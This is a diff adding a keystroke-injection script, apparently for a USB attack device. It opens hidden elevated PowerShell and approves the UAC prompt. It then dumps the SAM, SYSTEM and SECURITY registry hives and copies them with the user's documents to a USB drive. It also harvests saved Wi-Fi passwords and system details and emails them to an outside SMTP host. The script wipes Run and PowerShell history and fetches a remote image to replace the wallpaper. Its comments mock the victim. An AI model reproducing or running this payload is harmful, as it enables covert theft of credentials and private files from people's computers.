@@ -1,0 +1,32 @@
+//powerp4wn
+delay(4000);// wait for it...... wait gor it.......wait for it
+typingSpeed(0,0);//type fast as fuck
+//waitLED(NUM);//wait for the dumby to hit numlock to go, is skipped on triggered action. was for testing
+layout('us');//keyboard layout 
+press("GUI r");//WIN+r run box
+delay(200);
+type("powershell -w h");//run powershell not showing text "hidden"
+press("CTRL SHIFT ENTER");//run above as admin
+delay(2000);//adjust for the age and crappness of the target
+press("ALT Y");//accept win UAC
+//press("ENTER");//was for testing. may be needed 
+delay(1000);//now they are fuct and dont even know it
+type("reg.exe save hklm\\sam C:\\Windows\\Temp\\sam.save\n");//save goodies
+type("reg.exe save hklm\\system C:\\Windows\\Temp\\system.save\n");//save goodies
+type("reg.exe save hklm\\security C:\\Windows\\Temp\\security.save\n");//save goodies
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SanDisk' } | select name\n");//find usb drive
+type("Get-ChildItem -Path C:\\Users\\$env:UserName\\* -Include *.jpg,*.png,*.txt,*.doc,*.xml,*.xls,*.oab,*.xl,*.eml,*.msg,*.dbx,*.excel,*.xl,*.jpeg,*.ods -Recurse | Copy-Item -Destination $usbPath.name\n");//find and steal all the things savin to usb
+type("cp C:\\Windows\\temp\\sam.save $usbPath.name\n");//copy the saved things to usb
+type("cp C:\\Windows\\temp\\security.save $usbPath.name\n");//copy the saved things to usb
+type("cp C:\\Windows\\temp\\system.save $usbPath.name\n");//copy the saved things to usb
+//covering tracks
+type("del C:\\Windows\\Temp\\sam.save\n");//delete the saved things on win
+type("del C:\\Windows\\Temp\\system.save\n");//delete the saved things on win
+type("del C:\\Windows\\Temp\\security.save\n");//delete the saved things on win
+type('$o="AGH Computer Info v1.3`n`n PC Name: "+$Env:Computername+"`n`n";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$o+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;}$o+="`n`n Network`n`n";$o+=(Get-NetIPConfiguration -All | Out-String);$o+="Computer System`n`n";$o+=(Get-WmiObject -Class Win32_ComputerSystem | Out-String);$o+="Operating System`n`n";$o+=(Get-WmiObject -Class Win32_OperatingSystem | Out-String);$o+="Processor Information`n`n";$o+=(Get-WmiObject -Class Win32_Processor | Out-String);$o+="BIOS Information`n`n";$o+=(Get-WmiObject -Class Win32_BIOS | Out-String);$o+= "Desktop Information`n`n";$o+=(Get-WmiObject -Class Win32_Desktop | Out-String);$o+="Logon Session`n`n";$o+=(Get-WmiObject -Class Win32_LogonSession | Out-String);$o+="Hotfixes`n`n";$o+=(Get-WmiObject -Class Win32_QuickFixEngineering | Out-String);$c=New-Object Net.Mail.SmtpClient("oda555.com",25);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("emailaccountcreds","emailaccountpsswd");$d=New-Object System.Net.Mail.MailMessage;$d.From="senderemail";$d.To.Add("recieveremail");$d.Subject=($env:UserName+"@"+$env:UserDomain);$d.Body=$o;$c.Send($d);exit;\n');//get all the goodies including the wifi creds and email it as text file
+type("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f\n");//Delete the run history
+type("[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()\n");//delete the powershell buffer
+type("exit\n");//bounce out
+press("GUI r");//WIN+r run box
+delay(500);
+type("powershell -w h \"$p=$home+'\\153_linkedin.png';iwr https://tinyurl.com/y3r25jma -O $p;SP 'HKCU:Control Panel\\Desktop' WallPaper $p;1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True}\"\n");//one liner to change the marks wallpaper 
